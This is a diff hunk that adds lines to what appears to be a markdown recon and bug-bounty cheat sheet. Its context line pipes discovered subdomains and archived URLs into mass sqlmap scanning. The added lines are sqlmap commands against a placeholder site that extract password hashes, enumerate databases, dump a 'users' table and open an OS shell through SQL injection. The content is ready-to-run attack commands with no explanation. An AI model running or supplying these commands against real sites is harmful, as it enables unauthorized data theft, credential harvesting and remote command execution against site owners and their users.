@@ -60,6 +60,13 @@ cat http200 | waybackrobots -d $(cat url) -raw | anew wayROBOTS;
 
 ```bash
 findomain -t $(cat url) -q | httpx-toolkit -silent | anew | waybackurls | gf sqli >> sqli ; sqlmap -m sqli -batch --random-agent --level 1 | anew sqlmap;
+
+python sqlmap.py -u "www.exemplo.com?id=1" --batch --banner
+python sqlmap.py -u "www.exemplo.com?id=1" --batch --passwords
+python sqlmap.py -u "www.exemplo.com?id=1" --batch --dbs
+python sqlmap.py -u "www.exemplo.com?id=1" --batch --tables -D testdb
+python sqlmap.py -u "www.exemplo.com?id=1" --batch --dump -T users -D testdb
+python sqlmap.py -u "www.exemplo.com?id=1" --batch --os-shell
 ```
 
 ###  Whatweb. 
